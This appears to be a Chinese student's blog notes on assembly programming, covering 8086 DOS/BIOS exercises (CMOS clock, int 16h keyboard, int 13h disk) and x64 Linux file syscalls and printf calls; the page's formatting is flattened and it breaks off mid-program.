打印月份123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960assume cs:code,ss:stackdata segment db &#x27;i really love love you&#x27;,&#x27;$&#x27;data endsstack segment db 128 dup(&#x27;y&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,128 mov ax,0 mov al,8;把al写入数据端口 out 70h,al;把对于单元的数据读取到al in al,71h mov ah,al mov cl,4 shr ah,cl and al,00001111b add al,30h add ah,30h push ax mov ax,0b800h mov es,ax mov di,0 mov cx,2000 mov bx,0700h s: mov es:[di],bx add di,2 loop s pop ax mov di,160*10+20 mov cl,11001010b mov es:[di+0],ah mov es:[di+1],cl mov es:[di+2],al mov es:[di+3],cl mov ax,4c00h int 21hcode endsend start 打印年月日时分秒123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103assume cs:code,ss:stack, ds:datadata segment db &quot;2000/00/00/00:00:00-TIME-Dqx-Ghost&quot;,&#x27;$&#x27; db 9,8,7,4,2,0data endsstack segment db 128 dup(&#x27;y&#x27;)stack endscode segment start: mov ax,stack mov ss,ax mov sp,128 call clean_screen mov ax,data mov ds,ax k: call init_time call init_xy_and_show jmp k ;========================================== mov ax,4c00h int 21h ;====================================================================================== clean_screen: mov ax,0b800h mov es,ax mov di,0 mov cx,2000 mov bx,0700h clean_screen_start: mov es:[di],bx add di,2 loop clean_screen_start ret;====================================================================================== init_time: ;数据源已经被初始化了 ;循环6次 mov cx,6 ;初始化数据的指向 mov si,35 mov bx,2 ;循环体部分 init_time_start: push cx ;初始化端口编号 mov al,ds:[si] ;写入端口 out 70h,al in al,71h mov ah,al mov cl,4 shr ah,cl and al,00001111b add al,30h add ah,30h mov byte ptr ds:[bx+0],ah mov byte ptr ds:[bx+1],al add bx,3 inc si pop cx loop init_time_start ret;======================================================================== init_xy_and_show: mov ah,2 mov bh,0 mov dl,20 mov dh,10 int 10h ;数据源已经被初始化了 mov dx,0 mov ah,9 int 21h ret code endsend start 利用BIOS进行键盘的读写这里涉及到一个int 16h中断 12mov ax,0int 16h 它的运行结果会是怎么样? ①.寄存器ax中会有一份值 ah:扫描码的通码 al:扫描码的ASCII码 ②.键盘缓冲区中也会有一份值,高位通码,低位ASCII码,组成了一个字单元 这样的字单元会有15个 值得注意的是 int 16h会从键盘缓冲区读取数据,, 如果键盘缓冲区有数据就读取一个字节(至于读取谁,可以想象一下栈,它会读取最后进来那个) 如果没有数据,程序会一直等待你的输入..不会退出..直到键盘缓冲区有数据被它吃才会结束 核心的原理 读取键盘的输入,然后保存 如果输入back_space就让buff区那位置为0 如果输入enter,也是,然后那个位置置为0 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143assume cs:code,ss:stack,ds:datadata segment Arr db 128 dup(&#x27;D&#x27;) Table_A dw Store_ascii,show_str,Delete_Ascii which_one dw 0;函数指针的index index dw 0;输入的ascii有多少个 input dw 0;你的每一个键入的ascii的缓冲区 data endsstack segment db 128 dup(&#x27;S&#x27;)stack endscode segmentstart: mov ax,data mov ds,ax mov ax,stack mov ss,ax mov sp,128 mov di,20*2;你的输入在第一行的[20][0]处开始 call option mov ax,4c00h int 21h;-------------------------------------------------------------------- option: option_start: mov ax,0 int 16h cmp al,20h;20h是最小的ASCII,之后的是不可见字符 jnb main1 cmp al,08h;退格键 jz back_space cmp al,0dh jz enter_A jmp option_start option_ret: ret;----------------------------------------------------------------------- main1: mov which_one,0*2;调用store函数 mov bx,which_one call word ptr Table_A[bx] mov which_one,1*2 mov bx,which_one call word ptr Table_A[bx] jmp option_start;&#x27;----------------------------------------------------------------------------&#x27; back_space: mov which_one,2*2 mov bx,which_one call word ptr Table_A[bx] mov which_one,1*2 mov bx,which_one call word ptr Table_A[bx] jmp option_start;&#x27;----------------------------------------------------------------------------&#x27; enter_A: mov which_one,2*2 mov bx,which_one call word ptr Table_A[bx] mov which_one,1*2 mov bx,which_one call word ptr Table_A[bx] jmp option_ret;&#x27;----------------------------------------------------------------------------&#x27; Store_ascii: mov input,al mov bx,index mov\tbyte ptr [bx],al inc\tword ptr index ret;&#x27;----------------------------------------------------------------------------&#x27; Delete_Ascii: dec word ptr index mov input,0 mov bx,index mov\tword ptr [bx],0 ;退格太多,不能退太多,要回到初始位置 cmp di,40 jb back jnb back_fail back: mov di,40 back_fail: ret;&#x27;----------------------------------------------------------------------------&#x27; show_str: push ax push es mov ax,0b800h mov es,ax mov ax,160 cmp input,0 jne ok2 je ok1 ok1: sub di,2;把原来那个给删除了 mov byte ptr es:[di],0 jmp over ok2: mov al,input mov ah,2 mov es:[di],ax;初始化当前的 add di,2\t;然后指向下一个` over: pop es pop ax ret;&#x27;----------------------------------------------------------------------------&#x27;code endsend start 我没看懂它的输出位置的原理,这么久输出在了di+50的地方 你也没有把它的push与pop给看懂,乱七八糟的push与pop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122assume cs:codedata segmentdb 128 dup(&#x27;D&#x27;)data endscode segmentstart: mov ax,data mov ds,ax call func mov ax,4c00h int 21h func: push ax option: mov ah,0 int 16h cmp al,20h jb nochar mov ah,0 call main1 mov ah,2 call main1 jmp option nochar: cmp ah,0eh je backspace cmp ah,1ch je enter_ jmp option backspace: mov ah,1 call main1 mov ah,2 call main1 jmp option enter_: mov al,0 mov ah,0 call main1 mov ah,2 call main1 pop ax ret main1: jmp short Begin table_ dw Store_Ascii,Delete_Ascii,show check dw 0 Begin: push bx push dx push di push es cmp ah,2 ja main1_end mov bl,ah mov bh,0 add bx,bx;让bx翻倍 jmp word ptr table_[bx];为什么index一定是16位? Store_Ascii: mov bx,check mov ds:[bx],al inc check jmp main1_end Delete_Ascii: cmp check,0 je main1_end dec check mov bx,check jmp main1_end show: mov bx, 0b800h mov es,bx mov al,160 mov ah,0 mov di,ax ;下面这3行代码我真看不懂 ;add dl,dl ;mov dh,0 ;add di,dx mov bx,0 is_KG_or_not: cmp bx,check jne show_ascii mov byte ptr es:[di-1],2 mov byte ptr es:[di+0],&#x27; &#x27; jmp main1_end show_ascii: mov al,[bx] mov es:[di],al inc bx add di,2 jmp is_KG_or_not main1_end: pop es pop di pop dx pop bx ret code endsend start 利用BIOS进行磁盘的读写软盘 分为2面 每面软盘80个磁道 每个磁道18个扇区 每个扇区512个字节 使用参数 寄存器 写入-&gt;几个面 al 写入-&gt;背面还是反面 dh&#x3D;(0或者1) 写入-&gt;哪个磁道 ch 写入-&gt;哪个扇区 cl(1开始计数) 写入-&gt;哪个磁盘?A&#x2F;B&#x2F;C&#x2F;D dl 数据S&#x2F;D的短地址 ES 数据S&#x2F;D的偏移地址 BX 使用哪个功能 ah 中断 int 13h 逻辑扇区x (80xdh+ch)x18+cl-1 面号dh x/1440 磁道号ch (x%1400)/18 扇区号cl x%1400%18+1 把显存的4000字节依次写入1号,2号…8号扇区 1234567891011121314151617181920212223242526272829303132333435363738394041424344assume cs:code,ss:stack,ds:datadata segment data endsstack segment db 128 dup(&#x27;S&#x27;)stack endscode segmentstart: mov ax,data mov ds,ax mov ax,stack mov ss,ax mov sp,128 mov ax,0b800h;段地址 mov es,ax mov bx,0;偏移地址 mov al,8;写入8个扇区 mov dl,0;在正面写入 mov dh,0;0面 mov ch,0;0道 mov cl,1;1扇区 mov ah,3;读取 int 13h mov ax,4c00h int 21h;&#x27;----------------------------------------------------------------------------&#x27;code endsend start 我很疑惑它写入了多少?以什么样的格式写入 写入的是db,dw??? ascii? x64的文件处理源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364; file.asmsection .data;条件汇编表达式\tCREATE equ 1\t;创建\tOVERWRITE equ 1\t;重写\tAPPEND equ 1\t;追加\tO_WRITE equ 1\t;二进制写入\tREAD equ 1\t;读取\tO_READ equ 1\t;二进制读取\tDELETE equ 1\t;删除 ;系统调用符号\tNR_read equ 0 NR_write equ 1 NR_open equ 2 NR_close equ 3\tNR_lseek equ 8 NR_create equ 85\tNR_unlink equ 87;创建状态标志\tO_CREAT equ 00000100q\t;二进制创建\tO_APPEND equ 00002000q\t;二进制追加;访问模式 O_RDONLY equ 000000q O_WRONLY equ 000001q O_RDWR equ 000002q;创建权限\tS_IRUSR equ 00400q ;user read permission\tS_IWUSR equ 00200q ;user write permission NL equ 0xa bufferlen equ 64 fileName db &quot;testfile.txt&quot;,0\tFD dq 0\t; 文件描述符号\ttext1 db &quot;1. Hello...to everyone!&quot;,NL,0\tlen1 dq $-text1-1 ;remove 0\ttext2 db &quot;2. Here I am!&quot;,NL,0\tlen2 dq $-text2-1 ;remove 0\ttext3 db &quot;3. Alife and kicking!&quot;,NL,0\tlen3 dq $-text3-1 ;remove 0\ttext4 db &quot;Adios !!!&quot;,NL,0\tlen4 dq $-text4-1\terror_Create db &quot;error creating file&quot;,NL,0\terror_Close db &quot;error closing file&quot;,NL,0\terror_Write db &quot;error writing to file&quot;,NL,0\terror_Open db &quot;error opening file&quot;,NL,0\terror_Append db &quot;error appending to file&quot;,NL,0\terror_Delete db &quot;error deleting file&quot;,NL,0\terror_Read db &quot;error reading file&quot;,NL,0\terror_Print db &quot;error printing string&quot;,NL,0\terror_Position db &quot;error positioning in file&quot;,NL,0\tsuccess_Create db &quot;File created and opened&quot;,NL,0\tsuccess_Close db &quot;File closed&quot;,NL,NL,0\tsuccess_Write db &quot;Written to file&quot;,NL,0\tsuccess_Open db &quot;File opened for reading/(over)writing/updating&quot;,NL,0\tsuccess_Append db &quot;File opened for appending&quot;,NL,0\tsuccess_Delete db &quot;File deleted&quot;,NL,0\tsuccess_Read db &quot;Reading file&quot;,NL,0\tsuccess_Position\tdb &quot;Positioned in file&quot;,NL,0 section .bss buffer resb bufferlensection .text global main main:\tpush rbp\tmov rbp,rsp\t%IF CREATE\t;创建打开,然后关闭\tmov rdi, fileName\tcall createFile\tmov qword [FD], rax ; save descriptor\t; write to file #1\tmov rdi, qword [FD]\tmov rsi, text1\tmov rdx, qword [len1]\tcall writeFile ; close file\tmov rdi, qword [FD]\tcall closeFile\t%ENDIF\t%IF OVERWRITE\t;OPEN AND OVERWRITE A FILE, THEN CLOSE ---------------------------------------\t; open file mov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor\t; write to file #2 OVERWRITE!\tmov rdi, qword [FD]\tmov rsi, text2\tmov rdx, qword [len2]\tcall writeFile ; close file\tmov rdi, qword [FD]\tcall closeFile %ENDIF\t%IF APPEND\t;OPEN AND APPEND TO A FILE, THEN CLOSE ---------------------------------------\t; open file to append\tmov rdi, fileName call appendFile mov qword [FD], rax ; save file descriptor\t; write to file #3 APPEND!\tmov rdi, qword [FD]\tmov rsi, text3\tmov rdx, qword [len3]\tcall writeFile ; close file\tmov rdi, qword [FD]\tcall closeFile %ENDIF\t%IF O_WRITE\t;OPEN AND OVERWRITE AT AN OFFSET IN A FILE, THEN CLOSE -----------------------\t; open file to write\tmov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor\t; position file at offset\tmov rdi, qword[FD]\tmov rsi, qword[len2] ;offset at this location\tmov rdx, 0\tcall positionFile ; write to file at offset\tmov rdi, qword[FD]\tmov rsi, text4\tmov rdx, qword [len4]\tcall writeFile ; close file\tmov rdi, qword [FD]\tcall closeFile %ENDIF\t%IF READ\t;OPEN AND READ FROM A FILE, THEN CLOSE ---------------------------------------\t; open file to read\tmov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor ; read from file\tmov rdi, qword [FD]\tmov rsi, buffer\tmov rdx, bufferlen call readFile\tmov rdi,rax\tcall printString\t; close file\tmov rdi, qword [FD]\tcall closeFile %ENDIF\t%IF O_READ\t;OPEN AND READ AT AN OFFSET FROM A FILE, THEN CLOSE ---------------------------------------\t; open file to read\tmov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor ; position file at offset\tmov rdi, qword[FD]\tmov rsi, qword[len2] ;skip the first line\tmov rdx, 0\tcall positionFile ; read from file\tmov rdi, qword [FD]\tmov rsi, buffer\tmov rdx, 10 ;number of characters to read\tcall readFile\tmov rdi,rax\tcall printString\t; close file\tmov rdi, qword [FD]\tcall closeFile %ENDIF\t%IF DELETE\t;DELETE A FILE -------------------------------------------------- ; delete file UNCOMMENT NEXT LINES TO USE\tmov rdi, fileName\tcall deleteFile %ENDIF\tleave\tret; FILE MANIPULATION FUNCTIONS-------------------------------------;-----------------------------------------------------------------\tglobal readFilereadFile:\tmov rax, NR_read\tsyscall ; rax contains # of characters read\tcmp rax, 0 jl readerror\tmov byte [rsi+rax],0\t; add a terminating zero to the string\tmov rax, rsi\tmov rdi, success_Read\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tretreaderror:\tmov rdi, error_Read call printString\tret ;-----------------------------------------------------------------global deleteFiledeleteFile:\tmov rax, NR_unlink\tsyscall\tcmp rax, 0 jl deleteerror\tmov rdi, success_Delete\tcall printString\tretdeleteerror:\tmov rdi, error_Delete call printString\tret ;-----------------------------------------------------------------\tglobal appendFileappendFile:\tmov rax, NR_open mov rsi, O_RDWR|O_APPEND\tsyscall\tcmp rax, 0 jl appenderror\tmov rdi, success_Append\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tretappenderror:\tmov rdi, error_Append call printString\tret ;-----------------------------------------------------------------global openFileopenFile:\tmov rax, NR_open mov rsi, O_RDWR\tsyscall\tcmp rax, 0 jl openerror\tmov rdi, success_Open\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tretopenerror:\tmov rdi, error_Open call printString\tret ;-----------------------------------------------------------------\tglobal writeFilewriteFile:\tmov rax, NR_write\tsyscall\tcmp rax, 0 jl writeerror\tmov rdi, success_Write\tcall printString\tretwriteerror:\tmov rdi, error_Write call printString\tret;-----------------------------------------------------------------global positionFilepositionFile:\tmov rax, NR_lseek\tsyscall\tcmp rax, 0 jl positionerror\tmov rdi, success_Position\tcall printString\tretpositionerror:\tmov rdi, error_Position call printString\tret ;-----------------------------------------------------------------\tglobal closeFilecloseFile:\tmov rax, NR_close\tsyscall\tcmp rax, 0 jl closeerror\tmov rdi, success_Close\tcall printString\tretcloseerror:\tmov rdi, error_Close call printString\tret ;-----------------------------------------------------------------\tglobal createFilecreateFile:\tmov rax, NR_create\tmov rsi, S_IRUSR |S_IWUSR syscall\tcmp rax, 0 ; file descriptor in rax\tjl createerror\tmov rdi, success_Create\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tretcreateerror:\tmov rdi, error_Create call printString\tret ; PRINT FEEDBACK;-----------------------------------------------------------------global printStringprintString:; Count characters mov r12, rdi mov rdx, 0 strLoop: cmp byte [r12], 0 je strDone inc rdx ;length in rdx inc r12 jmp strLoopstrDone: cmp rdx, 0 ; no string (0 length) je prtDone mov rsi,rdi mov rax, 1 mov rdi, 1 syscallprtDone: ret 注意一些寄存器调用约定 好比eax是返回值,那么的话,eax就不要被偷偷的修改掉 一个函数肯定会有返回值,只是你用不用返回值 当eax有用,你就push 当eax无用,你就随意了 函数输出1234567891011121314151617181920212223242526global printString;参数;rdi 字符串地址;功能;实现字节计数,放在rdx,然后syscall输出;printString:; Count characters mov r12, rdi mov rdx, 0 strLoop: cmp byte [r12], 0 je strDone inc rdx ;length in rdx inc r12 jmp strLoopstrDone: cmp rdx, 0 ; no string (0 length) je prtDone mov rsi,rdi mov rax, 1 mov rdi, 1 syscallprtDone: ret 创建12mov rdi, fileNamecall createFile 12345678910111213141516171819202122232425;-----------------------------------------------------------------global createFile;参数 rdi:文件的名字;功能:\t创建一个文件,成功就打印超过,失败就打印失败;返回值\trax;注意事项:\t一些函数会默默地修改寄存器,我们得事先把它push一下createFile: ;mov rdi, fileName mov rsi, S_IRUSR | S_IWUSR ;user read permission | user write permission mov rax, NR_create\t;85 syscall cmp rax, 0 jl createerror mov rdi, success_Create\tpush\trax ; caller saved call printString\tpop rax ; caller saved retcreateerror: mov rdi, error_Create call printString ret ; PRINT FEEDBACK;---------------------------------------------------------------- 1mov qword [FD], rax ; save descriptor 写入1234mov rdi, qword [FD]mov rsi, text1mov rdx, qword [len1]call writeFile 1234567891011121314151617181920212223242526272829;-----------------------------------------------------------------;文件名 writeFile;参数;rdi 文件句柄;rsi 字符串地址;rdx 字符串长度;功能 把一个字符串写入文件;返回值 没用用到;注意事项 global writeFilewriteFile: ;rdi 文件句柄 ;rsi 字符串地址 ;rdx 字符串长度 mov rax, NR_write\t;1 syscall cmp rax, 0 ;返回rax 写入失败就返回负数 jl writeerror mov rdi, success_Write call printString ret writeerror: mov rdi, error_Write call printString ret;----------------------------------------------------------------- 关闭12mov rdi, qword [FD]call closeFile 1234567891011121314151617181920;函数名 关闭文件;参数 rdi, qword [FD],文件句柄;功能 关闭文件,失败就打印1失败,成功就打印成功;返回值: 未使用;注意事项:null\tglobal closeFile\tcloseFile:\tmov rax, NR_close ;3\tsyscall\tcmp rax, 0 jl closeerror\tmov rdi, success_Close\tcall printString\tret\tcloseerror:\tmov rdi, error_Close call printString\tret 打开12mov rdi, fileName call openFile 12345678910111213141516171819202122;函数名 打开文件;参数 rdi, fileName ;功能 打开文件;返回值 rax 文件句柄;注意事项 global openFileopenFile: ;rdi, fileName mov rsi, O_RDWR\t;访问模式\tmov rax, NR_open ;系统调用符号\tsyscall\tcmp rax, 0 jl openerror\tmov rdi, success_Open\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tret\topenerror:\tmov rdi, error_Open call printString\tret 1mov qword [FD], rax ; save file descriptor 追加形式打开12mov rdi, fileName call appendFile 12345678910111213141516171819202122;;函数名 文件追加;参数 文件名rdi, fileName;功能;返回值 文件句柄;注意事项 文件指针的还原global appendFileappendFile:\t;rdi, fileName\tmov rsi, O_RDWR|O_APPEND\t;访问模式|追加状态标志\tmov rax, NR_open ;系统调用符号\tsyscall\tcmp rax, 0 jl appenderror\tmov rdi, success_Append\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tretappenderror:\tmov rdi, error_Append call printString\tret 1mov qword [FD], rax ; save file descriptor 定位偏移量12345; position file at offsetmov rdi, qword[FD]mov rsi, qword[len2] ;offset at this locationmov rdx, 0call positionFile 它是怎么设置偏移量的??? 为什么最后关闭文件的时候还是用了改变后的指针.?&#x2F;?&#x2F;?&#x2F;? 123456789101112131415161718192021222324252627;函数名 定位文件偏移量;参数 ;rdi, qword[FD] 文件句柄;rsi, qword[len2] ;偏移量;rdx, 0;功能 改变句柄?;注意事项 指针的还原;返回值global positionFilepositionFile:\t;rdi 文件句柄\t;rsi 偏移量\t;rdx 0\tmov rax, NR_lseek\tsyscall\tcmp rax, 0 jl positionerror\tmov rdi, success_Position\tcall printString\tretpositionerror:\tmov rdi, error_Position call printString\tret 读取1234mov rdi, qword [FD]mov rsi, buffermov rdx, bufferlen call readFile 123456789101112131415161718192021222324252627282930;函数名 读取文件;参数 ;rdi, qword [FD] 文件指针;rsi, buffer 字符串缓冲区;rdx, bufferlen 缓冲区长度;syscall读取长度;功能;返回值 字符串地址global readFilereadFile:\t;rdi, qword [FD]\t;rsi, buffer\t;rdx, bufferlen\tmov rax, NR_read\tsyscall ; rax contains # of characters read\tcmp rax, 0 ;返回值是一个文件字符串的长度\tjl readerror\tmov byte [rsi+rax],0\t; add a terminating zero to the string\tmov rax, rsi\tmov rdi, success_Read\tpush\trax ; caller saved\tcall printString\tpop rax ; caller saved\tretreaderror:\tmov rdi, error_Read call printString\tret 返回字符串地址 12mov rdi,raxcall printString 删除文件12345678910111213141516;函数名 删除文件;参数 mov rdi, fileNameglobal deleteFiledeleteFile:\t;mov rdi, fileName\tmov rax, NR_unlink\tsyscall\tcmp rax, 0 jl deleteerror\tmov rdi, success_Delete\tcall printString\tretdeleteerror:\tmov rdi, error_Delete call printString\tret 例子创建&#x2F;写入&#x2F;关闭12345678910111213141516%IF CREATE;创建打开,然后关闭mov rdi, fileNamecall createFilemov qword [FD], rax ; save descriptor; write to file #1mov rdi, qword [FD]mov rsi, text1mov rdx, qword [len1]call writeFile ; close filemov rdi, qword [FD]call closeFile%ENDIF 打开&#x2F;覆盖&#x2F;关闭123456789101112131415161718%IF OVERWRITE;OPEN AND OVERWRITE A FILE, THEN CLOSE ---------------------------------------; open file mov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor; write to file #2 OVERWRITE!mov rdi, qword [FD]mov rsi, text2mov rdx, qword [len2]call writeFile ; close filemov rdi, qword [FD]call closeFile %ENDIF 追加&#x2F;写入&#x2F;关闭1234567891011121314151617%IF APPEND;OPEN AND APPEND TO A FILE, THEN CLOSE ---------------------------------------; open file to append mov rdi, fileName call appendFile mov qword [FD], rax ; save file descriptor ; write to file #3 APPEND! mov rdi, qword [FD] mov rsi, text3 mov rdx, qword [len3] call writeFile ; close file mov rdi, qword [FD] call closeFile %ENDIF 打开&#x2F;定位偏移量&#x2F;追加型覆盖写入&#x2F;关闭1234567891011121314151617181920212223%IF O_WRITE;OPEN AND OVERWRITE AT AN OFFSET IN A FILE, THEN CLOSE -----------------------; open file to writemov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor; position file at offsetmov rdi, qword[FD]mov rsi, qword[len2] ;offset at this locationmov rdx, 0call positionFile ; write to file at offsetmov rdi, qword[FD]mov rsi, text4mov rdx, qword [len4]call writeFile ; close filemov rdi, qword [FD]call closeFile %ENDIF 打开&#x2F;读取&#x2F;关闭1234567891011121314151617181920%IF READ;OPEN AND READ FROM A FILE, THEN CLOSE ---------------------------------------; open file to readmov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor ; read from filemov rdi, qword [FD]mov rsi, buffermov rdx, bufferlen call readFilemov rdi,raxcall printString; close filemov rdi, qword [FD]call closeFile %ENDIF 打开&#x2F;定位偏移&#x2F;读取&#x2F;关闭12345678910111213141516171819202122232425%IF O_READ;OPEN AND READ AT AN OFFSET FROM A FILE, THEN CLOSE ---------------------------------------; open file to readmov rdi, fileName call openFile mov qword [FD], rax ; save file descriptor ; position file at offsetmov rdi, qword[FD]mov rsi, qword[len2] ;skip the first linemov rdx, 0call positionFile ; read from filemov rdi, qword [FD]mov rsi, buffermov rdx, 10 ;number of characters to readcall readFilemov rdi,raxcall printString; close filemov rdi, qword [FD]call closeFile %ENDIF 删除文件123456%IF DELETE;DELETE A FILE -------------------------------------------------- ; delete file UNCOMMENT NEXT LINES TO USEmov rdi, fileNamecall deleteFile %ENDIF 汇编调用C库函数调用C库函数会默认修改一些寄存器 123456789.text:00000000004012F1 push rsi.text:00000000004012F2 push rdx.text:00000000004012F3 push rcx.text:00000000004012F4 push rbp.text:00000000004012F5 call _printf.text:00000000004012FA pop rbp.text:00000000004012FB pop rcx.text:00000000004012FC pop rdx.text:00000000004012FD pop rsi 所以的话,见到这些代码也不要惊讶… 这些push不是传递参数 并且printf的参数rdi也没有被传递进去 这些push只不过是默默地保存一下参数 x86首先在头文件引入库 1includelib msvcrt.lib 一个应用的例子 12345678910111213141516171819202122232425262728include Dqx.inc\t;对要用的函数做一些声明printf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg.data\tn_input byte &quot;%d %d&quot;,0\tn_output\tbyte &quot;%d+%d=%d&quot;,10,0\ts_output\tBYTE &quot;%s&quot;,10,0\tstr1 byte &quot;welcome to my world&quot;,10 byte &quot;please input 2 NUm&quot;,0\ta dd\t0\tb dd\t0.codestart:\tinvoke\tprintf,addr s_output,addr str1\tinvoke\tscanf,addr n_input,addr a,addr b\tmov\teax,0\tadd\teax,a\tadd\teax,b\tinvoke\tprintf,addr n_output,a,b,eax\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- end start 1.对于参数的传递,他得是32位的数据长度 好比一个void fun(char ascii),函数的汇编会有一个强制类型的转化,把你传入的一个字节变为32位的长度 2.参数传递的顺序,参数会从右到左依次push或者mov [esp+4],,,,, x64仍然需要在外部声明 linux下调用printfrax为0,表示0个非浮点数 rdi 格式化字符串的地址,第一个参数 rdx放第二个参数 rsi 数值&#x2F;字符串地址, 数值好比[var],字符串地址就用数组的名字 遇到浮点数 rax&#x3D;3,表示你传入3个浮点数参数, 于是函数依次把xmm0,xmm1,xmm2,作为参数 movq传入当精度浮点数, movsd传入当精度浮点数 1234mov\trax,1movq xmm0,[f_Num]mov rdi,fmatcall printf 问题来了,它怎么知道我有几个参数????我传入rdi,一个字符串的地址,可是它会不会读取其它的寄存器呢??? rdi,第一个参数,xmm0第二个参数???? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354; hello2.asm section .data\tstr1\tdb &quot;welcome to my world&quot;,10,0 ;中断调用没有换行,这里手动添加一个\tlen1\tequ $-str1-1\tstr2\tdb &quot;I am Dqx_Ghost&quot;,0\tlen2\tequ $-str2-1 num dq 2001\tpi dq 3.14 fmt_int db &quot;%d&quot;,10,0\tfmt_double\tdb &quot;%lf&quot;,10,0\tfmt_str db &quot;%s&quot;,10,0section .bsssection .textextern printf global mainmain:\tpush\trbp\tmov rbp,rsp mov rax,1\tmov rdi,1\tmov rsi,str1\tmov rdx,len1\tsyscall\tmov rax,0\tmov rsi,str2\tmov rdi,fmt_str\tcall\tprintf mov rax,0\tmov rsi,[num]\tmov rdi,fmt_int\tcall\tprintf mov rax,1\tmovq\txmm0,[pi]\tmov rdi,fmt_double\tcall\tprintf mov rsp,rbp\tpop rbp\tmov rax, 60 ; 60 = exit\tmov rdi, 0 ; 0 = success exit code\tsyscall ; quit windows下printfrcx是第一个参数 堆栈对齐123456789.text:00000000004012F1 push rsi.text:00000000004012F2 push rdx.text:00000000004012F3 push rcx.text:00000000004012F4 push rbp.text:00000000004012F5 call _printf.text:00000000004012FA pop rbp.text:00000000004012FB pop rcx.text:00000000004012FC pop rdx.text:00000000004012FD pop rsi 其实他没有必要push那么多的东西 但是一定要堆栈对齐 于是他就push了一些没有的东西用于了堆栈对齐 实验8086 课程设计1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321;=======================================================assume cs:code , ds:data, ss:stack;=======================================================data segment;年份 db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27; db &#x27;1982&#x27;,&#x27;1983&#x27;,&#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27; db &#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;,&#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27; ;收入 dd 16,22,382,1356,2398,8000,16000 dd 24486,50065,97479,140417,197514,345980,590827 dd 803528,1183000,1843000,2759000,3753000,4649000,5937000 ;员工数量 dw 3,7,9,13,28,38,130 dw 220,476,778,1001,1442,2258,2793 dw 4037,5635,8226,11542,14438,15257,17800data ends table segment db 21 dup (&#x27;0123456789ABCDEF&#x27;) table ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack endsstring segment db 10 dup(&#x27;0&#x27;)string ends;=======================================================code segmentstart:;main code ;=======================================================;数据源S mov ax,data mov ds,ax ;数据地D mov ax,7e00h mov es,ax ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call input_table call clear_screen call output_tableover: mov ax,4c00h int 21h;======================================================= ;functioninput_table: mov ax,data mov ds,ax mov ax,table mov es,ax mov si,0 mov di,21*4*2 mov bx,0 mov cx,21inputtable: ;year ;这个push与pop非常的妙,把4个字节,巧妙的传送 push ds:[si] pop es:[bx] push ds:[si+2] pop es:[bx+2] ;x mov ax,ds:[si+21*4+0] mov dx,ds:[si+21*4+2] mov es:[bx+5],ax mov es:[bx+7],dx ;y push ds:[di] pop es:[bx+10] ;z div word ptr es:[bx+10] mov es:[bx+13],ax add si,4 add di,2 add bx,16 loop inputtable retclear_screen: mov ax,0b800h mov es,ax mov bx,0 mov dx,0700h mov cx,2000clearscreen: mov es:[bx],dx add bx,2 loop clearscreen ret output_table: mov ax,table mov ds,ax mov ax,string mov es,ax mov si,0 mov cx,21 mov di,160*3 mov bx,9 ;[9]是10个当中最后一个位置outputtable: call show_year call show_x call show_y call show_z add di,160 add si,16 loop outputtable retshow_year: push ax push bx push cx push dx push ds push si push es push di mov ax,0b800h mov es,ax add di,3*2 mov cx,4showyear: mov ah,2 mov al,ds:[si] mov es:[di],ax inc si add di,2 loop showyear pop di pop es pop si pop ds pop dx pop cx pop bx pop ax ret show_x: push ax push bx push cx push dx push ds push si push es push 